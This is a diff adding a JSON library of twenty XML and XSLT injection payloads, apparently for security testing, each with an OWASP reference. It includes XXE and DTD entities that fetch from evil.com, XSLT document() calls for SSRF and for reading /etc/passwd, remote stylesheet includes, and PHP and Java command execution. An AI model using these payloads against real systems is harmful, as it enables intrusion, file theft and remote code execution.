@@ -1,0 +1,122 @@
+[
+  {
+    "id": "xml-001", "family": "xml_injection", "subtype": "xml_injection",
+    "payload_string": "<!-- INJECTED XML COMMENT -->", "context": "xml",
+    "description": "XML comment injection to bypass parsing logic",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-002", "family": "xml_injection", "subtype": "xml_injection",
+    "payload_string": "<!CDATA[[INJECTED]]>", "context": "xml",
+    "description": "XML CDATA injection",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-003", "family": "xml_injection", "subtype": "xml_injection",
+    "payload_string": "</tag><injected_tag>value</injected_tag><tag>", "context": "xml",
+    "description": "XML tag breakout and element injection",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-004", "family": "xml_injection", "subtype": "xml_injection",
+    "payload_string": "'><injected_tag>value</injected_tag><tag attr='", "context": "xml",
+    "description": "XML attribute breakout and element injection (single quotes)",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-005", "family": "xml_injection", "subtype": "xml_injection",
+    "payload_string": "\"><injected_tag>value</injected_tag><tag attr=\"", "context": "xml",
+    "description": "XML attribute breakout and element injection (double quotes)",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-006", "family": "xml_injection", "subtype": "xml_injection",
+    "payload_string": "&amp;lt;injected_tag&amp;gt;", "context": "xml",
+    "description": "XML entity encoding injection",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-007", "family": "xml_injection", "subtype": "xml_injection",
+    "payload_string": "<?xml-stylesheet type=\"text/xsl\" href=\"http://evil.com/evil.xsl\"?>", "context": "xml",
+    "description": "XML stylesheet processing instruction injection",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-008", "family": "xml_injection", "subtype": "xml_injection",
+    "payload_string": "&xxe;", "context": "xml",
+    "description": "XML external entity (XXE) reference injection",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-009", "family": "xml_injection", "subtype": "xml_injection",
+    "payload_string": "<![DOCTYPE html [ <!ENTITY % payload SYSTEM \"http://evil.com/payload.dtd\"> %payload; ]>", "context": "xml",
+    "description": "XML DTD parameter entity injection",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XML_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-010", "family": "xml_injection", "subtype": "xslt_injection",
+    "payload_string": "<xsl:value-of select=\"system-property('xsl:version')\"/>", "context": "xml",
+    "description": "XSLT injection - Version retrieval",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XSLT_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-011", "family": "xml_injection", "subtype": "xslt_injection",
+    "payload_string": "<xsl:value-of select=\"system-property('xsl:vendor')\"/>", "context": "xml",
+    "description": "XSLT injection - Vendor retrieval",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XSLT_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-012", "family": "xml_injection", "subtype": "xslt_injection",
+    "payload_string": "<xsl:value-of select=\"unparsed-entity-uri('evil')\"/>", "context": "xml",
+    "description": "XSLT injection - Entity URI retrieval",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XSLT_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-013", "family": "xml_injection", "subtype": "xslt_injection",
+    "payload_string": "<xsl:value-of select=\"document('http://evil.com/ssrf')\"/>", "context": "xml",
+    "description": "XSLT injection - SSRF via document()",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XSLT_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-014", "family": "xml_injection", "subtype": "xslt_injection",
+    "payload_string": "<xsl:value-of select=\"document('file:///etc/passwd')\"/>", "context": "xml",
+    "description": "XSLT injection - LFI via document()",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XSLT_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-015", "family": "xml_injection", "subtype": "xslt_injection",
+    "payload_string": "<xsl:copy-of select=\"document('http://evil.com/ssrf')\"/>", "context": "xml",
+    "description": "XSLT injection - SSRF via copy-of document()",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XSLT_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-016", "family": "xml_injection", "subtype": "xslt_injection",
+    "payload_string": "<xsl:include href=\"http://evil.com/evil.xsl\"/>", "context": "xml",
+    "description": "XSLT injection - Remote inclusion",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XSLT_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-017", "family": "xml_injection", "subtype": "xslt_injection",
+    "payload_string": "<xsl:import href=\"http://evil.com/evil.xsl\"/>", "context": "xml",
+    "description": "XSLT injection - Remote import",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XSLT_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-018", "family": "xml_injection", "subtype": "xslt_injection",
+    "payload_string": "<xsl:template match=\"/\"><xsl:value-of select=\"system-property('xsl:version')\"/></xsl:template>", "context": "xml",
+    "description": "XSLT injection - Template injection",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XSLT_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "xml-019", "family": "xml_injection", "subtype": "xslt_injection",
+    "payload_string": "xmlns:php=\"http://php.net/xsl\" xsl:version=\"1.0\" php:function=\"system\"(\"id\")", "context": "xml",
+    "description": "XSLT injection - PHP code execution",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XSLT_Injection"], "platform_specific": {"php": true}
+  },
+  {
+    "id": "xml-020", "family": "xml_injection", "subtype": "xslt_injection",
+    "payload_string": "<rt:script xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\" expr=\"rt:exec(rt:getRuntime(), 'id')\"/>", "context": "xml",
+    "description": "XSLT injection - Java code execution via Xalan",
+    "references": ["https://owasp.org/www-community/vulnerabilities/XSLT_Injection"], "platform_specific": {"java": true}
+  }
+]
